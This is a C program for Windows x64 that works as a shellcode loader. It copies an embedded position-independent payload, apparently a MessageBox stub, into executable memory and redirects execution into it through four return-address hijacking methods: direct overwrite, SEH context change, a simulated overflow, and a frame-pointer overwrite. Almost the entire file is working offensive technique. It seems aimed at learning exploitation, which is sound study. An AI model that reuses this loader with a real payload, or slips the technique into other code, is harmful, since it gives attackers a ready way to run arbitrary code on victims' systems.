#include <Windows.h>
#include <stdio.h>

// x64 MessageBox shellcode (position-independent)
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x52\x65\x74\x75\x72\x6e\x20"
    "\x41\x64\x64\x72\x65\x73\x73\x21\x00\x48\x65\x6c\x6c\x6f\x20"
    "\x57\x6f\x72\x6c\x64\x21\x00";

// Function that will have its return address overwritten
__declspec(noinline) DWORD WINAPI VulnerableFunction(LPVOID lpParam)
{
    printf("[*] VulnerableFunction executing...\n");
    printf("[*] Stack frame at: %p\n", &lpParam);

    // Allocate shellcode on heap (but we'll use return address overwrite)
    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (execMem)
    {
        memcpy(execMem, shellcode, sizeof(shellcode));
        printf("[+] Shellcode allocated at: %p\n", execMem);

        // METHOD 1: Overwrite return address directly
        // Get return address from stack (x64: return address at RSP)
        printf("[*] Overwriting return address...\n");

        // RSP points to return address on x64
        PVOID *returnAddress = (PVOID *)_AddressOfReturnAddress();

        printf("[*] Original return address: %p\n", *returnAddress);
        printf("[*] Return address location: %p\n", returnAddress);

        // OVERWRITE! When function returns, it goes to shellcode
        *returnAddress = execMem;

        printf("[+] Return address overwritten to: %p\n", *returnAddress);
        printf("[!] Function will return to shellcode!\n");
    }

    return 0x12345678;
}

// Function that uses SEH to overwrite return address
VOID SEHReturnOverwrite()
{
    printf("\n[*] SEH-based return address overwrite...\n");

    __try
    {
        // Simulate exception
        int *p = NULL;
        *p = 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // In exception handler, we can modify context
        printf("[+] Exception caught! Modifying return address...\n");

        // Get context
        CONTEXT ctx;
        RtlCaptureContext(&ctx);

        // Allocate shellcode
        LPVOID execMem = VirtualAlloc(
            NULL,
            sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        memcpy(execMem, shellcode, sizeof(shellcode));

        // Overwrite return address in context
        ctx.Rip = (DWORD64)execMem;

        // Set context
        RtlRestoreContext(&ctx, NULL);
    }
}

// Function that overwrites its own return address via buffer overflow simulation
VOID BufferOverflowSimulation()
{
    printf("\n[*] Buffer overflow simulation...\n");

    BYTE buffer[16];
    LPVOID execMem = NULL;

    // Allocate shellcode
    execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMem);

    // Simulate overflow - overwrite return address
    // On x64, return address is at RBP+8
    PVOID *returnAddr = (PVOID *)((BYTE *)_AddressOfReturnAddress());

    printf("[*] Original return address: %p\n", *returnAddr);
    *returnAddr = execMem;
    printf("[*] New return address: %p\n", *returnAddr);

    // Function will return to shellcode
}

// Function that overwrites return address via frame pointer
VOID FramePointerOverwrite()
{
    printf("\n[*] Frame pointer overwrite...\n");

    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(execMem, shellcode, sizeof(shellcode));

    // On x64, return address is at RBP+8
    BYTE *rbp;
    __asm__ volatile("movq %%rbp, %0" : "=r"(rbp));

    PVOID *returnAddr = (PVOID *)(rbp + 8);

    printf("[*] RBP: %p\n", rbp);
    printf("[*] Return address at: %p\n", returnAddr);
    printf("[*] Original: %p\n", *returnAddr);

    *returnAddr = execMem;

    printf("[*] Overwritten to: %p\n", *returnAddr);
}

int main()
{
    printf("[ Return Address Overwrite (x64) ]\n");
    printf("[*] Process ID: %d\n", GetCurrentProcessId());

    // METHOD 1: Direct return address overwrite
    printf("\n=== METHOD 1: Direct Return Address Overwrite ===\n");
    VulnerableFunction(NULL);

    // This may not execute if return address overwrite worked
    printf("[!] If you see this, return address overwrite failed!\n");
    system("pause");

    // METHOD 2: SEH-based return address overwrite
    printf("\n=== METHOD 2: SEH Return Address Overwrite ===\n");
    SEHReturnOverwrite();
    system("pause");

    // METHOD 3: Buffer overflow simulation
    printf("\n=== METHOD 3: Buffer Overflow Simulation ===\n");
    BufferOverflowSimulation();
    system("pause");

    // METHOD 4: Frame pointer overwrite
    printf("\n=== METHOD 4: Frame Pointer Overwrite ===\n");
    FramePointerOverwrite();

    return 0;
}

// x86_64-w64-mingw32-gcc -o return_address_overwrite.exe return_address_overwrite.c